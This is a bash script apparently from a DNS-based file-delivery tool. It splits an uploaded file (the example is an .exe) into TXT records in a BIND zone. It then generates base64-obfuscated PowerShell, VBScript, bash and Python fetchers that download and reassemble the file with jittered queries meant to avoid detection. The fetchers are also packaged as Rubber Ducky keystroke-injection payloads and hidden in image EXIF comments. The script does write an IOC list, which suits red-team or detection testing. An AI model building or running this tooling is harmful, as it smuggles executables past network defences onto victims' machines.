#!/bin/bash
# Example: ./mkzoneslices.sh file.exe hackers.com fonts.cdn uploads/9eec33bd-75c2-4e67-a543-2e28c5370fae [udptcp | udp ]

if [ "$#" -ne 5 ]; then
    echo "Error: Missing arguments for mkzoneslices.sh!"
    echo "Example: ./mkzoneslices.sh file.exe hackers.com fonts.cdn uploads/<some UUID here> [udptcp | udp ]"
    exit 2
fi
export filename=$1
export domain=$2
export subdomain=$3
export filedir=$4
export method=$5
export tmpzone=".tmp.zone"
export filepath=$4"/"$1
export BINDZONEDIR="/etc/bind/zones/"
export stencilexifimg="public/images/default.png" # template image to stick fetcher code into exif
export wordlist="scripts/words.txt" # wordlist of random subdomains
export vbsfetcher=$filedir"/get-"$subdomain"."$domain".vbs"
export ps1fetcher=$filedir"/get-"$subdomain"."$domain".ps1"
export shfetcher=$filedir"/get-"$subdomain"."$domain".sh"
export pyfetcher=$filedir"/get-"$subdomain"."$domain".py"
export duckyvbsfetcher=$filedir"/ducky-vbs-"$subdomain"."$domain".txt"
export duckypsfetcher=$filedir"/ducky-ps-"$subdomain"."$domain".txt"
export duckyshfetcher=$filedir"/ducky-sh-"$subdomain"."$domain".txt"
export duckypyfetcher=$filedir"/ducky-py-"$subdomain"."$domain".txt"
export exifvbsimg=$filedir"/vbs-"$subdomain"."$domain".png"
export exifpsimg=$filedir"/ps-"$subdomain"."$domain".png"
export exifshimg=$filedir"/sh-"$subdomain"."$domain".png"
export exifpyimg=$filedir"/py-"$subdomain"."$domain".png"
export JITTERMAX=5 # Random value between 1 and JITTERMAX seconds to sleep between DNS requests to avoid detection and enhance stability

# remove old files
rm .rawlines .newdeck .receipt $tmpzone 2> /dev/null

### GENERATE THE ZONE FILE BASED ON THE SELECTED METHOD: UDP AND TCP OR UDP ONLY ###

cat $filepath | xxd -p | tr -d '\n' | sed -e 's/.\{255\}/&\n/g' > .rawlines
echo >> .rawlines
export RAWLINECOUNT=`wc -l .rawlines | awk '{print $1}' | tr -d '\n'`
shuf -n $RAWLINECOUNT $wordlist > .newdeck

if [ "${method}" = "udp" ]; then
    paste -d ' ' .newdeck .rawlines | awk -v prefix="$subdomain" '{ print  prefix "." $1 " IN TXT \"" $2 "\"" }' > $tmpzone
    cp .newdeck .receipt
elif [ "${method}" = "udptcp" ]; then
    mapfile -t deck < .newdeck
    export subcount=0
    export sub=""
    while mapfile -t -n 254 ary && ((${#ary[@]})); do
          sub=${deck[$subcount]};
          echo $sub >> .receipt
          printf "%s.%s IN TXT (" ${subdomain} ${sub}  >> $tmpzone
          for (( i=0; i<${#ary[@]}; i++ )); do
            printf "\"%s\"" "${ary[$i]}" >> $tmpzone
            export dif=$(("${#ary[@]}" - 1))
            [ "$i" == "$dif" ] && printf ")\n" >> $tmpzone || printf "\n" >> $tmpzone
          done
          subcount=$((subcount+1))
    done < .rawlines
else
   echo "Error: Missing arguments for mkzoneslices.sh! Transport not correctly specified as [udp] or [udptcp] (default)"
        exit 2
fi

# Create the DNS IOC list
for receiptline in $(cat .receipt); do echo $subdomain.$receiptline.$domain >>  "$filepath.subs.txt"; done

# we need to return a number of dns records as output of this script to be shown in UI
cat .receipt | wc -l | tr -d '\n\r' 

cat $tmpzone >> $BINDZONEDIR$domain".inc"
rm $tmpzone > /dev/null

export curserial=$(grep -i serial $BINDZONEDIR"db."$domain | awk '{print $1}')
export newserial=$(echo $curserial | grep -i serial $BINDZONEDIR"db."$domain | sed -e 's/^\s*//g' | sed -r 's/(20[0-9]{3,8})(.*$)/echo `expr \1 + 1` "\2"/e' | awk '{print $1}')
sed -i "s/$curserial/$newserial/" $BINDZONEDIR"db."$domain
rndc reload $domain >> /dev/null

# Generate the Windows PowerShell fetcher
export out="\$outfile = \"$filename\""
export dom="\$domain = \"$domain\""
export subdomainline="\$subdomain = \"$subdomain\""
export hex="\$dnshexfile = \"tmp.txt\""
export ps1jitter="\$jittermax = $JITTERMAX"
export receiptlongstr="\$subs = @("
for rel in $(cat .receipt); do
        receiptlongstr=$receiptlongstr\'$rel\'","
done
receiptlongstr=${receiptlongstr::-1}
receiptlongstr=$receiptlongstr")"
export subs=$receiptlongstr
export pullcode="JGppdHRlcnRpbWUgPSBHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gJGppdHRlcm1heAokc3Vic3RvdGFsID0gJHN1YnMuTGVuZ3RoCiRpID0gMQokd3JpdGVvdXQgPSBbU3lzdGVtLlN0cmluZ106OkNvbmNhdCgiUmV0cmlldmluZyBmaWxlICIsJG91dGZpbGUsIi4uLiIpCmVjaG8gJHdyaXRlb3V0CmZvciAoJHN1YmQ9MDsgJHN1YmQgLWx0ICRzdWJzdG90YWw7ICRzdWJkKyspIHsKICAkd3JpdGVvdXQgPSBbU3lzdGVtLlN0cmluZ106OkNvbmNhdCgiPiBSZXF1ZXN0aW5nICIsJHN1YmRvbWFpbiwiLiIsJHN1YnNbJHN1YmRdLCIuIiwkZG9tYWluLCIgKCIsKCRzdWJkKzEpLCIvIiwkc3Vic3RvdGFsLCIpLi4uIikKICBlY2hvICR3cml0ZW91dAogICRhZGRyZXNzID0gJHN1YmRvbWFpbiArICIuIiArICRzdWJzWyRzdWJkXSArICIuIiArICRkb21haW4KICAkcmV0ID0gUmVzb2x2ZS1EbnNOYW1lIC1OYW1lICRhZGRyZXNzIC1UeXBlIFRYVAogIGVjaG8gJHJldC5TdHJpbmdzIHwgT3V0LUZpbGUgLU5vTmV3bGluZSAtQXBwZW5kIC1GaWxlUGF0aCAkZG5zaGV4ZmlsZQogIGlmICgkaSAtbmUgJHN1YnN0b3RhbCkgeyAKICAgICR3cml0ZW91dCA9IFtTeXN0ZW0uU3RyaW5nXTo6Q29uY2F0KCJTbGVlcGluZyBmb3IgIiwkaml0dGVydGltZSwicy4uLiIpCiAgICBlY2hvICR3cml0ZW91dAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGppdHRlcnRpbWUKICAgICRqaXR0ZXJ0aW1lID0gR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtICRqaXR0ZXJtYXgKICAgICRpKysKICB9Cn0KU3RhcnQtU2xlZXAgLVNlY29uZHMgMQplY2hvICJETlMgcmV0cmlldmFsIGRvbmUgLSBjb252ZXJ0aW5nIHRvIGZpbGUuLi4iCiRoZXhzdHIgPSBHZXQtQ29udGVudCAtcGF0aCAkZG5zaGV4ZmlsZSAtcmVhZGNvdW50IDAKJGhleHN0ciA9ICRoZXhzdHJbMF0KJGNvdW50ID0gJGhleHN0ci5sZW5ndGgKJGJ5dGVDb3VudCA9ICRjb3VudC8yCiRieXRlcyA9IE5ldy1PYmplY3QgYnl0ZVtdICRieXRlQ291bnQKJGJ5dGUgPSAkbnVsbAokeCA9IDAKZm9yICgkaiA9IDA7ICRqIC1sZSAkY291bnQtMTsgJGorPTIpIHsKICAkYnl0ZXNbJHhdID0gW2J5dGVdOjpQYXJzZSgkaGV4c3RyLlN1YnN0cmluZygkaiwyKSwgW1N5c3RlbS5HbG9iYWxpemF0aW9uLk51bWJlclN0eWxlc106OkhleE51bWJlcikKICAkeCs9IDEKfQpTZXQtQ29udGVudCAtRW5jb2RpbmcgYnl0ZSAkb3V0ZmlsZSAtdmFsdWUgJGJ5dGVzClJlbW92ZS1JdGVtIC1QYXRoICRkbnNoZXhmaWxlCmVjaG8gIkRvbmUuIg=="
echo $out > $ps1fetcher
echo $subdomainline >> $ps1fetcher
echo $subs >> $ps1fetcher
echo $dom >> $ps1fetcher
echo $hex >> $ps1fetcher
echo $ps1jitter >> $ps1fetcher
echo $pullcode | /usr/bin/base64 -d >> $ps1fetcher
echo >> $ps1fetcher

# Generate the VBScript fetcher
export out="outfile = \"$filename\""
export dom="domain = \"$domain\""
export subdomainline="subdomain = \"$subdomain\""
export hex="dnshexfile = \"tmp.txt\""
export vbsjitter="jittermax = $JITTERMAX"
export receiptlongstr="subs = Array("
for rel in $(cat .receipt); do
        receiptlongstr=$receiptlongstr\"$rel\"","
done
receiptlongstr=${receiptlongstr::-1}
receiptlongstr=$receiptlongstr")"
export subs=$receiptlongstr
export header="UmVtIFJ1biBmaWxlIHdpdGggY3NjcmlwdCA8c2NyaXB0Pi52YnMgb3IgZmFjZSBwb3B1cCBoZWxsCkRpbSBvdXRmaWxlLCBkb21haW4sIHN1YmRvbWFpbiwgZG5zaGV4ZmlsZSwgU3RyZWFtLCBPYmpYTUwsIEJpbk5vZGUsIGRuc2NtZCwgc3Vicwo="
export vbspullcode="aml0dGVydGltZSA9IEludCgoaml0dGVybWF4LTErMSkqUm5kKzEpCnN1YnN0b3RhbCA9IFVCb3VuZChzdWJzKSArIDEKaSA9IDEKU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKSAKV3NjcmlwdC5FY2hvICJSZXRyaWV2aW5nIGZpbGUgIiAmIG91dGZpbGUgJiAiLi4uIgpGb3IgZWFjaCBzdWJkIGluIHN1YnMKICAgIFdzY3JpcHQuRWNobyAiPiBSZXF1ZXN0aW5nICIgJiBzdWJkb21haW4gJiAiLiIgJiBzdWJkICYgIi4iICYgZG9tYWluICYgIiAoIiAmIGkgJiAiLyIgJiBzdWJzdG90YWwgJiAiKS4uLiIKICAgIGRuc2NtZCA9ICJjbWQgL2MgbnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgIiAmIHN1YmRvbWFpbiAmICIuIiAmIHN1YmQgJiAiLiIgJiBkb21haW4gJiAiIHwgZmluZHN0ciBcXiIiID4+ICIgJiBkbnNoZXhmaWxlCiAgICBXc2hTaGVsbC5SdW4gZG5zY21kLCA1LCBUcnVlCiAgICBJZiBpIDw+IHN1YnN0b3RhbCBUaGVuIAogICAgICAgV3NjcmlwdC5FY2hvICJTbGVlcGluZyBmb3IgIiAmIGppdHRlcnRpbWUgJiAiLi4uIgogICAgICAgV1NjcmlwdC5zbGVlcCAoaml0dGVydGltZSAqIDEwMDApCiAgICAgICBqaXR0ZXJ0aW1lID0gSW50KChqaXR0ZXJtYXgtMSsxKSpSbmQrMSkKICAgICAgIGk9aSsxCiAgICBFbmQgSWYKTmV4dApXc2NyaXB0LkVjaG8gIldhaXRpbmcgZm9yIEROUyByZXNwb25zZXMgdG8gZmluaXNoLi4uIgpXU2NyaXB0LnNsZWVwIDMwMDAKV3NjcmlwdC5FY2hvICJDb252ZXJ0aW5nLi4uIgpTZXQgb2JqRmlsZVRvUmVhZCA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKS5PcGVuVGV4dEZpbGUoZG5zaGV4ZmlsZSwgMSwgdHJ1ZSkKc3RyQVNDSEVYID0gb2JqRmlsZVRvUmVhZC5SZWFkQWxsKCkKc3RyQVNDSEVYID0gUmVwbGFjZShzdHJBU0NIRVgsQ2hyKDM0KSwiIiwgMSwgLTEpCnN0ckFTQ0hFWCA9IFJlcGxhY2Uoc3RyQVNDSEVYLENocig5KSwiIiwgMSwgLTEpCnN0ckFTQ0hFWCA9IFJlcGxhY2Uoc3RyQVNDSEVYLENocigzMiksIiIsIDEsIC0xKQpzdHJBU0NIRVggPSBSZXBsYWNlKHN0ckFTQ0hFWCx2YkNyLCIiLCAxLCAtMSkKc3RyQVNDSEVYID0gUmVwbGFjZShzdHJBU0NIRVgsdmJMZiwiIiwgMSwgLTEpCnN0ckFTQ0hFWCA9IFJlcGxhY2Uoc3RyQVNDSEVYLHZiQ3JMZiwiIiwgMSwgLTEpCldzY3JpcHQuRWNobyAiV3JpdGluZyB0byBmaWxlICIgJiBvdXRmaWxlICYgIi4uLiIKU2V0IE9ialhNTCA9IENyZWF0ZU9iamVjdCgiTWljcm9zb2Z0LlhNTERPTSIpClNldCBCaW5Ob2RlID0gT2JqWE1MLkNyZWF0ZUVsZW1lbnQoImJpbmFyeSIpClNldCBTdHJlYW0gPSBDcmVhdGVPYmplY3QoIkFET0RCLlN0cmVhbSIpCkJpbk5vZGUuRGF0YVR5cGUgPSAiYmluLmhleCIKQmluTm9kZS5UZXh0ID0gc3RyQVNDSEVYClN0cmVhbS5UeXBlID0gMQpTdHJlYW0uT3BlbgpTdHJlYW0uV3JpdGUgQmluTm9kZS5Ob2RlVHlwZWRWYWx1ZQpTdHJlYW0uU2F2ZVRvRmlsZSBvdXRmaWxlLCAyClN0cmVhbS5DbG9zZQpvYmpGaWxlVG9SZWFkLkNsb3NlClNldCBvYmpGaWxlVG9EZWwgPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikKb2JqRmlsZVRvRGVsLkRlbGV0ZUZpbGUgZG5zaGV4ZmlsZSwgdHJ1ZQpXc2NyaXB0LkVjaG8gIkRvbmUuIg=="
echo $header | /usr/bin/base64 -d > $vbsfetcher
echo >> $vbsfetcher
echo $out >> $vbsfetcher
echo $subdomainline >> $vbsfetcher
echo $dom >> $vbsfetcher
echo $subs >> $vbsfetcher
echo $hex >> $vbsfetcher
echo $vbsjitter >> $vbsfetcher
echo $vbspullcode | /usr/bin/base64 -d >> $vbsfetcher
echo >> $vbsfetcher

### GENERATE *X BASH FETCHER ###
export out="export outfile=\"$filename\""
export dom="export domain=\"$domain\""
export subdomainline="export subdomain=\"$subdomain\""
export receiptlongstr="export subs=("
for el in $(cat .receipt); do
        receiptlongstr=$receiptlongstr\"$el\"" "
done
receiptlongstr=$receiptlongstr")"
export receiptarray=$receiptlongstr
export shjitter="export JITTERMAX=$JITTERMAX"
export shpullcode="ZXhwb3J0IHN1YnN0b3RhbD0iJHsjc3Vic1tAXX0iCmV4cG9ydCB0bXBvdXQ9LiRSQU5ET00KZXhwb3J0IGppdHRlcnRpbWU9JCgoJFJBTkRPTSAlICRKSVRURVJNQVggKyAxKSkKZXhwb3J0IGk9MQppZiBbWyAkKHdoaWNoIGhvc3QpIF1dCnRoZW4KICAgZXhwb3J0IGRuc2NtZD0iaG9zdCIKZWxpZiBbWyAkKHdoaWNoIGRpZykgXV0KdGhlbgogICBleHBvcnQgZG5zY21kPSJkaWciCmVsc2UKICAgZWNobyAiQmluYXJ5IGhvc3Qgb3IgZGlnIG5vdCBmb3VuZCEgRXhpdGluZy4uLiIKICAgZXhpdCAxCmZpCmlmIFtbICEgJCh3aGljaCB4eGQpIF1dCnRoZW4KICAgZWNobyAieHhkIG5vdCBmb3VuZCEgRXhpdGluZy4uLiIKICAgZXhpdCAxCmZpCmVjaG8gIlJldHJpZXZpbmcgZmlsZSAkb3V0ZmlsZSB1c2luZyBcIiRkbnNjbWRcIiBjb21tYW5kLi4uIgpmb3Igc3ViIGluICR7c3Vic1tAXX07CmRvCiAgIGVjaG8gIj4gUmVxdWVzdGluZyAkc3ViZG9tYWluLiRzdWIuJGRvbWFpbiAoJGkvJHN1YnN0b3RhbCkuLi4iCiAgIGlmIFtbICRkbnNjbWQgPT0gImhvc3QiIF1dCiAgIHRoZW4KICAgICAgaG9zdCAtdCBUWFQgJHN1YmRvbWFpbi4kc3ViLiRkb21haW4gfCBncmVwIC12ICc6JyB8IHRyIC1kICdeXG4kJyB8IHNlZCAtZSAncy9eLip0ZXh0IFwiLy9nJyB8IHRyIC1kICdbIiBdXG4nID4+ICR0bXBvdXQ7CiAgIGVsc2UKICAgICAgZGlnICtzaG9ydCAtdCBUWFQgJHN1YmRvbWFpbi4kc3ViLiRkb21haW4gfCB0ciAtZCAnWyIgXVxuJyA+PiAkdG1wb3V0OwogICBmaQogICBpZiBbWyAkaSAhPSAkc3Vic3RvdGFsIF1dCiAgIHRoZW4KICAgICAgZWNobyAiU2xlZXBpbmcgJGppdHRlcnRpbWUgc2Vjb25kcy4uLiIKICAgICAgc2xlZXAgJGppdHRlcnRpbWUKICAgICAgaml0dGVydGltZT0kKCgkUkFORE9NICUgJEpJVFRFUk1BWCArIDEpKQogICAgICBpPSQoKGkrMSkpCiAgIGZpCmRvbmUKeHhkIC1yIC1wICR0bXBvdXQgPiAkb3V0ZmlsZQpybSAkdG1wb3V0ID4+IC9kZXYvbnVsbAplY2hvICJEb25lLiI="
echo "#!/bin/bash" >> $shfetcher
echo $out >> $shfetcher
echo $receiptarray >> $shfetcher
echo $dom >> $shfetcher
echo $subdomainline >> $shfetcher
echo $shjitter >> $shfetcher
echo $shpullcode | /usr/bin/base64 -d >> $shfetcher
echo >> $shfetcher

### GENERATE PYTHON3 FETCHER ###
export out="outfile=\"$filename\""
export dom="domain=\"$domain\""
export subdomainline="subdomain=\"$subdomain\""
export receiptlongstr="subs=["
for rel in $(cat .receipt); do
        receiptlongstr=$receiptlongstr\"$rel\"","
done
receiptlongstr=${receiptlongstr::-1}
receiptlongstr=$receiptlongstr"]"
export pyjitter="jittermax=$JITTERMAX"
export pyheader="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwppbXBvcnQgZG5zLnJlc29sdmVyCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCgo="
export pypullcode="cm5kbnVtcyA9ICcnLmpvaW4oKHJhbmRvbS5jaG9pY2UoJzEyMzQ1Njc4OScpIGZvciBpIGluIHJhbmdlKDQpKSkKdG1wZmlsZSA9ICJpbi4iICsgcm5kbnVtcyArICIudG1wIgphZGRyZXNzID0gIiIKYW5zd2VyID0gIiIKZW5jb2RpbmcgPSAndXRmLTgnCnRtcGZpbGVvYmogPSBvcGVuKHRtcGZpbGUsICdhJykKaml0dGVydGltZSA9IHJhbmRvbS5yYW5kaW50KDEsIGppdHRlcm1heCkKc3Vic3RvdGFsID0gbGVuKHN1YnMpCmkgPSAxCmZvciBzdWJkIGluIHN1YnM6CiAgcHJpbnQoIlJldHJpZXZpbmcgZmlsZSAiICsgb3V0ZmlsZSkKICBhZGRyZXNzID0gc3ViZG9tYWluICsgIi4iICsgc3ViZCArICIuIiArIGRvbWFpbgogIHByaW50KCI+IFJlcXVlc3RpbmcgIiArIHN1YmRvbWFpbiArICIuIiArIHN1YmQgKyAiLiIgKyBkb21haW4gKyAiICgiICsgc3RyKGkpICsgIi8iICsgc3RyKHN1YnN0b3RhbCkgKyAiKS4uLiIpCiAgcmVzb2x2ZXIgPSBkbnMucmVzb2x2ZXIuUmVzb2x2ZXIoKQogIGFuc3dlciA9IHJlc29sdmVyLnJlc29sdmUoYWRkcmVzcywgJ1RYVCcpCiAgZm9yIHJkYXRhIGluIGFuc3dlcjoKICAgIGZvciB0eHRfc3RyaW5nIGluIHJkYXRhLnN0cmluZ3M6CiAgICAgIHRtcGZpbGVvYmoud3JpdGUoc3RyKHR4dF9zdHJpbmcsIGVuY29kaW5nKSkKICBpZiAoaSAhPSBzdWJzdG90YWwpOgogICAgcHJpbnQoIlNsZWVwaW5nIGZvciAiICsgc3RyKGppdHRlcnRpbWUpICsgInMuLi4iKQogICAgdGltZS5zbGVlcChqaXR0ZXJ0aW1lKQogICAgaml0dGVydGltZSA9IHJhbmRvbS5yYW5kaW50KDEsIGppdHRlcm1heCkKICAgIGkrPTEKCnRpbWUuc2xlZXAoMSkKdG1wZmlsZW9iai5jbG9zZSgpCnByaW50KCJDb252ZXJ0aW5nIGZpbGUuLi4iKQp3aXRoIG9wZW4odG1wZmlsZSwgInIiKSBhcyBmOgogICAgaGV4ZHVtcCA9IGYucmVhZCgpLnN0cmlwKCkKd2l0aCBvcGVuKG91dGZpbGUsICJ3YiIpIGFzIGY6CiAgICBmLndyaXRlKGJ5dGVhcnJheS5mcm9taGV4KGhleGR1bXApKQoKb3MudW5saW5rKHRtcGZpbGUpCnByaW50ICgiRG9uZS4iKQ=="
echo $pyheader | /usr/bin/base64 -d >> $pyfetcher
echo $out >> $pyfetcher
echo $dom >> $pyfetcher
echo $subdomainline >> $pyfetcher
echo $receiptlongstr >> $pyfetcher
echo $pyjitter >> $pyfetcher
echo $pypullcode | /usr/bin/base64 -d >> $pyfetcher
echo >> $pyfetcher

### GENERATE DUCKY SCRIPT CODE FOR POWERSHELL ###
awk '{ print "STRING "$0"\nENTER" }' $ps1fetcher > $duckypsfetcher 

### GENERATE DUCKY SCRIPT CODE FOR VBSCRIPT ###
awk '{ print "STRING "$0"\nENTER" }' $vbsfetcher > $duckyvbsfetcher 

### GENERATE DUCKY SCRIPT CODE FOR *X ###
awk '{ print "STRING "$0"\nENTER" }' $shfetcher > $duckyshfetcher 

### GENERATE DUCKY SCRIPT CODE FOR PYTHON3 ###
awk '{ print "STRING "$0"\nENTER" }' $pyfetcher > $duckypyfetcher 

### GENERATE EXIF DATA FOR IMAGE FILE FOR POWERSHELL ###
# copy a fresh image to the upload dir
cp $stencilexifimg $exifpsimg
# add fetcher code to exif Comment" entry
/usr/bin/exiftool -overwrite_original -Comment="$(cat $ps1fetcher)" $exifpsimg >> /dev/null

### GENERATE EXIF DATA FOR IMAGE FILE FOR VBSCRIPT ###
# copy a fresh image to the upload dir
cp $stencilexifimg $exifvbsimg
# add fetcher code to exif Comment" entry
/usr/bin/exiftool -overwrite_original -Comment="$(cat $vbsfetcher)" $exifvbsimg >> /dev/null

### GENERATE EXIF DATA FOR IMAGE FILE FOR *X ###
# copy a fresh image to the upload dir
cp $stencilexifimg $exifshimg
# add fetcher code to exif Comment" entry
/usr/bin/exiftool -overwrite_original -Comment="$(cat $shfetcher)" $exifshimg > /dev/null

### GENERATE EXIF DATA FOR IMAGE FILE FOR PYTHON3 ###
# copy a fresh image to the upload dir
cp $stencilexifimg $exifpyimg
# add fetcher code to exif Comment" entry
/usr/bin/exiftool -overwrite_original -Comment="$(cat $pyfetcher)" $exifpyimg > /dev/null
rm .rawlines .newdeck .receipt $tmpzone 2> /dev/null
rndc reconfig >> /dev/null
